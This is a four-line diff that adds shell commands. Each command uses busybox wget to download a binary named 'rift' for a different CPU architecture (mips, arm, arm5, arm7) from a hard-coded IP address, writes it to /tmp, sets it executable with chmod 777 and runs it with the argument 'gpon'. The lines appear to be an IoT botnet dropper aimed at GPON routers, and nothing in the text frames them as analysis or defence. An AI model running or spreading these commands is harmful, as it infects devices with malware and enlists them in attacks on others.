@@ -1,0 +1,4 @@
+busybox wget http://23.254.224.150/bins/rift.mips -O - > /tmp/ree; busybox chmod 777 /tmp/ree; /tmp/ree gpon
+busybox wget http://23.254.224.150/bins/rift.arm -O - > /tmp/wqu; busybox chmod 777 /tmp/wqu; /tmp/wqu gpon
+busybox wget http://23.254.224.150/bins/rift.arm5 -O - > /tmp/nhe; busybox chmod 777 /tmp/nhe; /tmp/nhe gpon
+busybox wget http://23.254.224.150/bins/rift.arm7 -O - > /tmp/god; busybox chmod 777 /tmp/god; /tmp/god gpon
